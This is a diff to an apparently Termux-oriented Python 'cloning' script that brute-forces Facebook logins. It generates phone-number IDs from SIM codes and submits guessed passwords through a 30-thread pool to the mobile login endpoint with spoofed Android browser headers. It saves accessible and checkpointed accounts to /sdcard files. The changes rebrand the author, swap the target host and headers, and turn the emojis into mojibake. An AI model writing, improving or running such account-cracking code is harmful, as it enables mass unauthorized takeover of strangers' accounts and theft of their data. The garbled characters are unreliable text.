@@ -218,14 +218,14 @@ logo ="""  \033[1;92m ______
 \033[1;97m====================================================
 \033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mZunera
 \033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mZunera khan
-\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+923905040200 🙈
+\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+923905040200 ðŸ™ˆ
 \033[1;97m====================================================
-\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY MR Adi ]\x1b[00;1m\x1b[31;1m
+\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY Zunera ]\x1b[00;1m\x1b[31;1m
 \033[1;97m===================================================="""
 clear()
 os.system("xdg-open https://www.facebook.com/profile.php?id=100021956767252")
 xxxx = str(len(ugen))
-print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
 print('\033[1;97m====================================================') 
 print("\033[1;97m[+]\033[1;92m TOTAL USER AGENTS \033[1;91m: \033[1;96m" + xxxx)
 print('\033[1;97m====================================================') 
@@ -246,7 +246,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
     else:
-        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
+        print('\r[ðŸŽ®] \033[1;92m â˜† Your Active Apps â˜† \033[1;91m: \033[1;96m')
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
             #created by hbf team(owners) Adi & Hamii
@@ -257,7 +257,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
     else:
-        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
+        print('\r[ðŸŽ®] \033[1;96m â—‡ Your Expired Apps â—‡ \033[1;91m: \033[1;92m')
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
@@ -276,7 +276,7 @@ def main():
     clear()
     print (' \t           \033[1;37m[ \033[1;32mMAIN MENU \033[1;37m]')
     print('\033[1;97m====================================================') 
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
     print('\033[1;97m====================================================') 
@@ -299,7 +299,7 @@ def main():
 def passx():
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print('              \x1b[97m\033[37;41m[ PASSWORD MENU ]\033[0;m ')
     print('\033[1;97m====================================================') 
@@ -331,11 +331,11 @@ def pass1():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -346,7 +346,7 @@ def pass1():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -357,7 +357,7 @@ def pass1():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -372,7 +372,7 @@ def pass1():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -381,11 +381,11 @@ def pass2():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -396,7 +396,7 @@ def pass2():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -407,7 +407,7 @@ def pass2():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -422,7 +422,7 @@ def pass2():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -431,11 +431,11 @@ def pass3():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -446,7 +446,7 @@ def pass3():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -457,7 +457,7 @@ def pass3():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -472,7 +472,7 @@ def pass3():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -481,11 +481,11 @@ def pass4():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -496,7 +496,7 @@ def pass4():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -507,7 +507,7 @@ def pass4():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -522,7 +522,7 @@ def pass4():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -531,11 +531,11 @@ def pass5():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -546,7 +546,7 @@ def pass5():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -557,7 +557,7 @@ def pass5():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -572,7 +572,7 @@ def pass5():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -581,11 +581,11 @@ def pass6():
     os.system("clear")
     print(logo)
     clear()
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
-    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLEðŸ‘‡]\033[0;m")
     print('\033[1;97m====================================================') 
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
@@ -596,7 +596,7 @@ def pass6():
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
-    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;97m====================================================') 
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
     print('\033[1;97m====================================================') 
@@ -607,7 +607,7 @@ def pass6():
     with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print('\033[1;97m====================================================') 
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
@@ -622,7 +622,7 @@ def pass6():
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;97m====================================================') 
-    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
     print('\033[1;97m====================================================') 
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
@@ -650,13 +650,13 @@ def freeq(uid,pwx,tl):
             "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
+            header_freefb = { 'authority': 'x.facebook.com',
     'method': 'GET', 
     'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
